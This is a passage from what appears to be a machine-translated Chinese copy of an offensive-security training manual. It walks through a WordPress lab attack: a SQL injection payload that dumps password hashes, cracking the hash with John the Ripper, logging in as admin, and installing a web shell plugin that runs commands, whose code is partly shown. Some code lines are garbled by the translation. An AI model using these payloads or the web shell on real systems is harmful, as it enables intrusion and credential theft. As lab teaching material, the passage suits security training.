<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:172558;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.2.2.1.7</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:172579;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为此，我们需要将</font><font style="vertical-align: inherit;">查询中的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">user_login</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">替换</font><font style="vertical-align: inherit;">为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">user_pass</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:172614;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">["1650149780')) OR 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9, </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">user_pass</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ,11 </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">FROM wp_users</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> #"]</font></font></nobr></div>
<div style="position:absolute;top:172633;left:362"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 870 - 列出所有密码</font></font></i></nobr></div>
<div style="position:absolute;top:173109;left:313"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 330：查询 wp_users 中的所有密码</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:173140;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于我们的注入，我们能够恢复管理员的密码哈希。</font><font style="vertical-align: inherit;">注意编码</font></font></nobr></div>
<div style="position:absolute;top:173160;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在最后; </font><font style="vertical-align: inherit;">响应包含三个“\”字符来转义单个“/”。</font><font style="vertical-align: inherit;">这个哈希需要</font></font></nobr></div>
<div style="position:absolute;top:173179;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在我们尝试对 Web 应用程序进行身份验证之前被破解。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:173213;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.2.2.2 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:173243;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1、使用sqlmap利用SQL注入，提取用户名和密码。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:173278;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.2.3</font></font></i></nobr></div>
<div style="position:absolute;top:173278;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">破解密码</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:173315;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们有了密码哈希，我们需要破解它以获得明文密码。</font><font style="vertical-align: inherit;">尽管</font></font></nobr></div>
<div style="position:absolute;top:173335;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以运行传统的蛮力攻击，尝试每个字母组合，希望</font></font></nobr></div>
<div style="position:absolute;top:173354;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一个匹配，这可能需要很长时间。</font><font style="vertical-align: inherit;">相反，我们将选择开始使用</font></font></nobr></div>
<div style="position:absolute;top:173374;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“rockyou”词表，包含在 Kali Linux 中。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:173436;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果您还没有这样做，您可以通过解压缩</font></font></i></nobr></div>
<div style="position:absolute;top:173455;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">带有 gunzip 的 /usr/share/wordlists/rockyou.txt.gz 文件。</font><font style="vertical-align: inherit;">这将替换存档</font></font></i></nobr></div>
<div style="position:absolute;top:173475;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">带有纯文本文件的文件。 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:173623;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="147"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 147 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:173656;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:174733;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:174733;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:174733;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">764</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:173752;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在继续之前，让我们创建一个包含密码哈希的文件。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:173787;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo "$P$BfBIi66MsPQgzmvYsUzwjc5vSx9L6i/" &gt; pass.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:173806;left:339"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 871 - 将密码添加到文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:173835;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们尝试使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开膛手约翰</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">破解密码</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">我们将使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">–wordlist</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项</font></font></nobr></div>
<div style="position:absolute;top:173855;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用我们的单词列表的路径并提供包含密码哈希的文件名。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:173889;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~/Desktop/sandbox.local$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">john --wordlist=/usr/share/wordlists/rockyou.txt pa</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:173907;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件.txt</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:173924;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:173941;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">！love29jan2006！</font><font style="vertical-align: inherit;">(?)</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:173957;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1g 0:00:22:59 完成 0.000724g/s 10391p/s 10391c/s 10391C/s !lovegod..!lov3h!m</font></font></nobr></div>
<div style="position:absolute;top:173974;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用“--show --format=phpass”可靠地显示所有破解的密码</font></font></nobr></div>
<div style="position:absolute;top:173992;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">会话已完成</font></font></nobr></div>
<div style="position:absolute;top:174011;left:352"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 872 - 运行开膛手约翰</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:174040;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行上述命令可能需要很长时间，具体取决于计算机的 CPU。</font><font style="vertical-align: inherit;">基于</font></font></nobr></div>
<div style="position:absolute;top:174060;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在清单 872 的输出中，John 指出密码是“!love29jan2006!”。</font><font style="vertical-align: inherit;">让我们试试看</font></font></nobr></div>
<div style="position:absolute;top:174079;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果我们可以登录到 Web 应用程序。</font></font></nobr></div>
<div style="position:absolute;top:174112;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">默认情况下，可以在 /wp-admin 中找到 WordPress 登录页面。</font><font style="vertical-align: inherit;">访问此页面会提示我们</font></font></nobr></div>
<div style="position:absolute;top:174131;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输入用户名和密码。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:174633;left:321"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 331：以管理员用户身份登录 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:174811;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="148"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 148 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:174844;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:175921;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:175921;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:175921;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">765</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:174934;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.2.3.1.1</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:174955;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">单击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Login 后</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，我们将进入管理仪表板。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:175482;left:377"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 332：成功登录</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:175541;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">您可能会收到验证管理员电子邮件的请求。</font><font style="vertical-align: inherit;">如果这是</font></font></i></nobr></div>
<div style="position:absolute;top:175560;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这种情况下，您只需单击“此电子邮件是正确的”即可继续。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:175623;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们已经登录了，我们可以继续我们的枚举之旅来发现我们应该做什么</font></font></nobr></div>
<div style="position:absolute;top:175642;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来利用。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:175676;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.2.4</font></font></i></nobr></div>
<div style="position:absolute;top:175676;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">枚举管理界面</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:175714;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">登录管理界面为进一步利用打开了大门。</font><font style="vertical-align: inherit;">在我们开始之前</font></font></nobr></div>
<div style="position:absolute;top:175734;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">探索提升我们当前访问权限的方法，让我们研究一下 WordPress 必须提供的选项。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:175999;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="149"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 149 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:176032;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:177109;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:177109;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:177109;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">766</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:176122;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.2.4.1.1</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:176143;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开始使用 WordPress 的一个好地方是</font><font style="vertical-align: inherit;">“</font><i><font style="vertical-align: inherit;">工具”</font></i><font style="vertical-align: inherit;"> &gt;“</font><i><font style="vertical-align: inherit;">站点健康”</font></i><font style="vertical-align: inherit;">部分</font><font style="vertical-align: inherit;">下的</font><font style="vertical-align: inherit;">“</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">信息”</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项卡</font><font style="vertical-align: inherit;">。</font></font><i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"></font><i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:176894;left:330"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 333：查看 WordPress 信息页面</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:176925;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在此页面上，我们可以确定服务器正在使用 PHP 版本 7.0.33- 运行 WordPress</font></font></nobr></div>
<div style="position:absolute;top:176944;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0ubuntu0.16.04.7。</font><font style="vertical-align: inherit;">我们还发现数据库运行在 10.5.5.11 IP 地址上，即</font></font></nobr></div>
<div style="position:absolute;top:176964;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与我们目前的目标不同。</font><font style="vertical-align: inherit;">这并不罕见，因为数据库和网络</font></font></nobr></div>
<div style="position:absolute;top:176983;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应用程序通常运行在不同的服务器上。</font></font></nobr></div>
<div style="position:absolute;top:177016;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们已经收集了一些基本信息，我们可以尝试提升我们的访问权限。</font><font style="vertical-align: inherit;">一</font></font></nobr></div>
<div style="position:absolute;top:177035;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对 WordPress 进行管理访问的便利方面是我们可以安装自己的</font></font></nobr></div>
<div style="position:absolute;top:177054;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">插件。</font><font style="vertical-align: inherit;">WordPress 中的插件是用 PHP 编写的，没有太多限制。</font><font style="vertical-align: inherit;">例如，</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:177187;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="150"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 150 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:177220;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:178297;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:178297;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:178297;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">767</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:177316;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以上传一个包含 PHP 反向 shell 或代码执行功能的插件。</font></font></nobr></div>
<div style="position:absolute;top:177335;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">幸运的是，其他人已经为此创建了恶意插件。</font></font></nobr></div>
<div style="position:absolute;top:177368;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">seclists</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包中</font><font style="vertical-align: inherit;">找到一个这样的插件</font><font style="vertical-align: inherit;">，它可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">apt</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">安装在 Kali 中</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:177403;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo apt install seclists</font></font></font></b></nobr></div>
<div style="position:absolute;top:177422;left:336"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 873 - 安装 seclists 包</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:177452;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">安装后，seclist 目录可以在 /usr/share/seclists 和我们所在的文件中找到</font></font></nobr></div>
<div style="position:absolute;top:177471;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">寻找可以在 Web-Shells/WordPress 中找到。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:177506;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cd /usr/share/seclists/Web-Shells/WordPress</font></font></font></b></nobr></div>
<div style="position:absolute;top:177540;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:/usr/share/seclists/Web-Shells/WordPress$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ls</font></font></font></b></nobr></div>
<div style="position:absolute;top:177557;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">绕过  </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">登录.php plugin-shell.php</font></font></font></b></nobr></div>
<div style="position:absolute;top:177576;left:314"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 874 - 列出 seclists WordPress web shell</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:177605;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们正在寻找的特定文件是 plugin-shell.php。</font><font style="vertical-align: inherit;">让我们快速检查它并找出它</font></font></nobr></div>
<div style="position:absolute;top:177625;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">做。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:177660;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1 &lt;?php</font></font></nobr></div>
<div style="position:absolute;top:177677;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2 /*</font></font></nobr></div>
<div style="position:absolute;top:177694;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3 插件名称：Cheap &amp; Nasty Wordpress Shell</font></font></nobr></div>
<div style="position:absolute;top:177710;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4 插件URI：https://github.com/leonjza/wordpress-shell</font></font></nobr></div>
<div style="position:absolute;top:177728;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5 描述：作为您为 wordpress 提供服务的网络服务器执行命令！</font></font></nobr></div>
<div style="position:absolute;top:177745;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Shell 可能位于 /wp-content/plugins/shell/shell.php。</font><font style="vertical-align: inherit;">可以给出命令</font></font></nobr></div>
<div style="position:absolute;top:177762;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 'cmd' GET 参数。</font><font style="vertical-align: inherit;">例如：“http://192.168.0.1/wp-content/plugins/shell/shell。</font></font></nobr></div>
<div style="position:absolute;top:177778;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">php?cmd=id"，应该为您提供诸如 &lt;code&gt;uid=33(www-data) gid=verd33(</font></font></nobr></div>
<div style="position:absolute;top:177795;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">www-data) groups=33(www-data)&lt;/code&gt;</font></font></nobr></div>
<div style="position:absolute;top:177812;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6 作者：里昂·雅各布斯</font></font></nobr></div>
<div style="position:absolute;top:177829;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7 版本：0.3</font></font></nobr></div>
<div style="position:absolute;top:177847;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8 作者URI：https://leonjza.github.io</font></font></nobr></div>
<div style="position:absolute;top:177863;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9 */</font></font></nobr></div>
<div style="position:absolute;top:177883;left:324"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 875 - WordPress 插件外壳注释</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:177912;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 875 中的第 2-9 行是 WordPress 将文件识别为</font></font></nobr></div>
<div style="position:absolute;top:177931;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">插入。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:177966;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">11 # 尝试保护自己不被删除</font></font></nobr></div>
<div style="position:absolute;top:177983;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">12 $this_file = __FILE__;</font></font></nobr></div>
<div style="position:absolute;top:178000;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">13 @system("chmod ugo-w $this_file");</font></font></nobr></div>
<div style="position:absolute;top:178017;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">14 @system("chattr +i $this_file");</font></font></nobr></div>
<div style="position:absolute;top:178037;left:356"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 876 - 自删除保护</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:178066;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 12-14 行试图保护文件不被系统删除。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:178101;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">19 # 测试是否存在参数“cmd”、“ip”或“port”。</font><font style="vertical-align: inherit;">如果不是，这将避免错误</font></font></nobr></div>
<div style="position:absolute;top:178118;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果配置不当，则在日志或所有页面上。</font></font></nobr></div>
<div style="position:absolute;top:178135;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">20 if(isset($_REQUEST[$cmd])) {</font></font></nobr></div>
<div style="position:absolute;top:178152;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21</font></font></nobr></div>
<div style="position:absolute;top:178169;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22 # 从 'cmd' GET 或 POST 参数（POST d</font></font></nobr></div>
<div style="position:absolute;top:178186;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不在 apache 日志上显示命令）</font></font></nobr></div>
<div style="position:absolute;top:178203;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">23 $command = $_REQUEST[$cmd];</font></font></nobr></div>
<div style="position:absolute;top:178219;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24 执行命令（$命令）；</font></font></nobr></div>
<div style="position:absolute;top:178239;left:349"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 877 - 检查 cmd 参数 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:178375;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="151"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 151 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:178408;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:179485;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:179485;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:179485;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">768</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
